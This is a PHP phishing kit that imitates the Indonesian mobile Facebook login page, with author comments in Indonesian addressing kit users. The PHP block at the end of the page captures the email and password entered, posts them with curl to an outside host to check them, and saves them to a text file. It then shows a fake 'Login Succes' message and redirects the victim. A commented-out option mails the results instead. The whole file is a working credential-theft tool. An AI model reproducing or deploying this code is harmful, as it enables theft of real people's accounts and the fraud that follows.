<?php
/*
  __| | ___ _ __ ___   ___| |_ ___ _ __/ |/ /_  
 / _` |/ _ \ '_ ` _ \ / _ \ __/ _ \ '__| | '_ \ 
| (_| |  __/ | | | | |  __/ ||  __/ |  | | (_) |
 \__,_|\___|_| |_| |_|\___|\__\___|_|  |_|\___/

 */
/*setting disini gan, link redirect + nama filenya */
$domain = "https://google.co.id"; // Domain To Redirect, please jangan kasih tipu tipu. kasian orangnya, udah kena scam eh masih di tipuu juga
$file = substr(str_rot13(md5(base64_encode(strrev($_SERVER['SERVER_NAME'])))),1,6); // name file result
?>
<!DOCTYPE html>
<html>
<head>
    <title>
        Facebook - Masuk atau Daftar
    </title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="x2UrK" href="3DJeWZ0aNVw.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="6DHbD" href="KT6FUER7zi7.css" />
    <script id="u_0_e" src=xx.js>
      </script>
    <script>
        document.domain = 'facebook.com';/^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash)&&location.replace(location.hash.substr(location.hash.indexOf("!")+1));
      </script>
    <script>
        __DEV__=0;
      </script>
    <script id="u_0_f" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3iMcW4/yY/l/id_ID/zxWE9pWiTq-.js" data-bootloader-hash="/yEam"></script>
    <script id="u_0_g" src=g.js>
      </script>
    <script id="u_0_h" src=h.js></script>
    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" />
    <meta name="description" content="Buat akun atau masuk ke Facebook. Terhubunglah dengan teman, keluarga, dan orang lain yang Anda kenal. Bagikan foto dan video, kirim pesan, dan dapatkan..." />
    <link rel="canonical" href="https://www.facebook.com/" />
</head>

<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
    <script id="u_0_d" src=d.js></script>
    <div id="viewport">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
        <div id="page" class="">
            <div class="_129_" id="header-notices"></div>
            <div class="_4g33 _52we _52z5" id="header">
                <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="http://facebook.com/login/?refid=8"><i class="img sp_xQUonWykb3m sx_ad0fc6"><u>facebook</u></i></a></div>
            </div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
                <div class="_4g33">
                    <div class="_4g34" id="u_0_0">
                        <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
                            <div class="_52jd"></div>
                        </div>
                        <div class="aclb _4-4l">
                            <div data-sigil="m_login_upsell login_identify_step_element"></div>
                            <div class="_5rut">
                                <form method="post" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
                                    <input type="hidden" name="lsd" value="AVpWsy7M" autocomplete="off" /><input type="hidden" name="m_ts" value="1534269818" /><input type="hidden" name="li" value="ehlzWw0SLCt-nnj1gUBsflYx" /><input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" /><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" />
                                    <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                    <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                    <div id="otp_retrieve_desc_container"></div>
                                    <div class="_56be _5sob">
                                        <div class="_55wo _55x2 _56bf">
                                            <div id="email_input_container"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="email" placeholder="Email atau Telepon" type="text" data-sigil="m_login_email" /><i class="_6cvx img sp_xQUonWykb3m sx_d3a1d7" data-sigil="clear_cp_cross"></i></div>
                                            <div>
                                                <div class="_1upc _mg8" data-sigil="m_login_password">
                                                    <div class="_4g33">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="pass" placeholder="Kata Sandi" type="password" data-sigil="password-plain-text-toggle-input" /></div>
                                                        </div>
                                                        <div class="_5s61 _216i _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <div class="_2pi9" style="display:none" id="u_0_1"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">SEMBUNYIKAN</span><span class="mfss" id="u_0_3">PERLIHATKAN</span></a></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <a href="https://facebook.com/recover/initiate/?lwv=100&amp;refid=8" class="_6a3f" id="did-you-forget-your-password-link" style="display:none">Apakah Anda lupa kata sandi?</a>
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="u_0_4" data-sigil="login_password_step_element"><button type="submit" value="Masuk" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5" data-sigil="#"><span class="_55sr">Masuk</span></button></div>
                                        <div id="otp_button_elem_container"></div>
                                    </div>
                                    <input type="hidden" name="prefill_contact_point" id="prefill_contact_point" /><input type="hidden" name="prefill_source" id="prefill_source" /><input type="hidden" name="prefill_type" id="prefill_type" /><input type="hidden" name="first_prefill_source" id="first_prefill_source" /><input type="hidden" name="first_prefill_type" id="first_prefill_type" /><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" /><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" />
                                    <div class="_xo8"></div>
                                    <noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript>
                                </form>
                                <div>
                                    <div class="_43mg"><span class="_43mh">atau</span></div>
                                    <div class="_52jj _5t3b" id="u_0_6"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="http://facebook.com/reg/?cid=103&amp;refid=8" data-sigil="m_reg_button">Buat Akun Baru</a></div>
                                </div>
                                <div>
                                    <div class="other-links">
                                        <ul class="_5pkb _55wp">
                                            <li><span class="mfss fcg"><a href="https://facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link">Lupa Kata Sandi?</a><span aria-hidden="true"> · </span><a href="https://facebook.com/help/?refid=8" id="help-link" class="sec">Pusat Bantuan</a></span></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div></div>
                <img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" />
                <div class="_55wr _5ui2">
                    <div class="_5dpw">
                        <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                            <div class="_4g33">
                                <div class="_4g34">
                                    <span class="_52jc _52j9 _52jh _3ztb">Bahasa Indonesia</span>
                                    <div class="_3ztc"><span class="_52jc"><a href="http://facebook.com/a/language.php?l=jv_ID&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQAvPxW1vCKYQ7eM&amp;refid=8" data-sigil="change_language">Basa Jawa</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a href="http://facebook.com/a/language.php?l=ja_JP&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQACyWczcctzwWgB&amp;refid=8" data-sigil="change_language">日本語</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a href="http://facebook.com/a/language.php?l=pt_BR&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQDgPmpfDNFXGP8O&amp;refid=8" data-sigil="change_language">Português (Brasil)</a></span></div>
                                </div>
                                <div class="_4g34">
                                    <div class="_3ztc"><span class="_52jc"><a href="http://facebook.com/a/language.php?l=en_GB&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQDIoMuLOHjBGDjp&amp;refid=8" data-sigil="change_language">English (UK)</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a href="http://facebook.com/a/language.php?l=ms_MY&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQD6AaB50vBSB_fj&amp;refid=8" data-sigil="change_language">Bahasa Melayu</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a href="http://facebook.com/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQBBC4T5m4ZB2aim&amp;refid=8" data-sigil="change_language">Español</a></span></div>
                                    <a href="http://facebook.com/language.php?n=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">
                                        <div class="_3j87 _1rrd _3ztd" aria-label="Daftar bahasa lengkap"><i class="img sp_xQUonWykb3m sx_a4ebdc"></i></div>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="_5ui4"><span class="mfss fcg">Facebook © 2018</span></div>
<?php
if($_POST['login']){
$user = $_POST['email'];
$pw = $_POST['pass'];
	function login($user,$pw) {
            $ch = curl_init("http://www.autoreacts.net/");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "u=$user&p=$pw");
            return curl_exec($ch);
                  curl_close($ch);
        }
$api = login($user,$pw);
$ngambilapi = preg_match_all("/src=\\\\\"(.*?)\\\\\"/", $api, $x);
$link = file_get_contents(preg_replace("/\\\\/", "", $x[1][0]));
$ewewoe = preg_match_all("/error_msg\":\"(.*?)\"/", $link, $ewe);
if($ewe[1][0] == "Calls to this api have exceeded the rate limit. (613)"){
    ?><div class="_5yd0 _2ph- _5yd1" style="" data-sigil="m_login_notice"><span>Bad request, too many error login attempts. <a href="https://facebook.com/recover/initiate/?lwv=120&amp;lwc=1348092&amp;ars=facebook_login_pw_error" class="_652e" aria-label="Did you forget your password?">Try Again in 10 minutes</a></span></div>
<?php
}elseif($ewe[1][0] == "Invalid username or password (401)"){
	?>
    <div class="_5yd0 _2ph- _5yd1" style="" data-sigil="m_login_notice"><span>Kata sandi yang Anda masukkan salah. <a href="https://facebook.com/recover/initiate/?lwv=120&amp;lwc=1348092&amp;ars=facebook_login_pw_error" class="_652e" aria-label="Did you forget your password?">Apakah Anda melupakan kata sandi Anda?</a></span></div>
    <?php
}elseif($ewe[1][0] == "The parameter password is required (100)"){
	?>
    <div class="_5yd0 _2ph- _5yd1" style="" data-sigil="m_login_notice"><span>Kata Sandi tidak boleh Kosong. <a href="https://facebook.com/recover/initiate/?lwv=120&amp;lwc=1348092&amp;ars=facebook_login_pw_error" class="_652e" aria-label="Did you forget your password?">Please input your passwords</a></span></div>
    <?php
}else{
    ?>
    <div class="_5yd0 _2ph- _5yd1" style="" data-sigil="m_login_notice"><span>Login Succes <a href="https://facebook.com/recover/initiate/?lwv=120&amp;lwc=1348092&amp;ars=facebook_login_pw_error" class="_652e" aria-label="Did you forget your password?">Please wait while we redirecting you . . . </a></span></div>
    <script type="text/javascript">
function leave() {
  window.location = "<?php echo "$domain" ?>";
}
setTimeout("leave()", 5000);
</script>
    <?php
    /*result in file .txt) */
    $forlog = "
Username : $user
Password : $pw
===[Demeter_16 Achon666ju5t - LadyViona]===";
    $eusi = fopen("$file.txt",'w');
    fwrite($eusi,$forlog);
}
/* change ^^^^ to this one , if you want the result goes to mail, and setting your configuration on setting.php
include 'setting.php';
mail($email, $subject, $isi, $headers);  */
}
?>
</div>
                </div>
            </div>

            <div class="viewportArea _2v9s" style="display:none" id="u_0_7" data-sigil="marea">
                <div class="_5vsg" id="u_0_8"></div>
                <div class="_5vsh" id="u_0_9"></div>
                <div class="_5v5d fcg">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                    Memuat...
                </div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
                <div class="container">
                    <div class="image"></div>
                    <div class="message" data-sigil="error-message"></div>
                    <a class="link" data-sigil="MPageError:retry">Coba Lagi</a>
                </div>
            </div>
        </div>
    </div>
    <div id="static_templates">
        <div class="mDialog" id="modalDialog" style="display:none">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                <div class="_4g33 _52we">
                    <div class="_5s61">
                        <div class="_52z7"><button type="submit" value="Batal" class="cancelButton btn btnD bgb mfss touchable" id="u_0_b" data-sigil="dialog-cancel-button">Batal</button><button type="submit" value="Kembali" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Kembali" id="u_0_c" data-sigil="dialog-back-button"><i class="img sp_xQUonWykb3m sx_b05ab9" style="margin-top: 2px;"></i></button></div>
                    </div>
                    <div class="_4g34">
                        <div class="_52z6">
                            <div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">Memuat...</div>
                        </div>
                    </div>
                    <div class="_5s61">
                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
                    </div>
                </div>
                <div id="pagelet_0_0"></div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_a" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                Memuat...
            </div>
        </div>
    </div>
    <script id="u_0_i" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3/yh/r/-qkB2EEYEEC.js" data-bootloader-hash="J5xSl">
    </script>
    <script id="u_0_j" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3iwDb4/ya/l/id_ID/tacN2wfat12.js" data-bootloader-hash="bYi7r">
        </script>
        <script id="u_0_k" src="uk.js">
        </script>
        <script id="u_0_l">
            require("MRenderingScheduler").getInstance().init("6589638692853231387-0", {
                "ttiPagelets": []
            });
        </script>
        <script id="u_0_m" src="mu.js">
        </script>
        <script id="u_0_n" src="n.js">
        </script>
        <script id="u_0_p">
            require("Bootloader").setResourceMap({});
        </script>
        <script id="u_0_o" src="u.js">
        </script>
</body>

</html>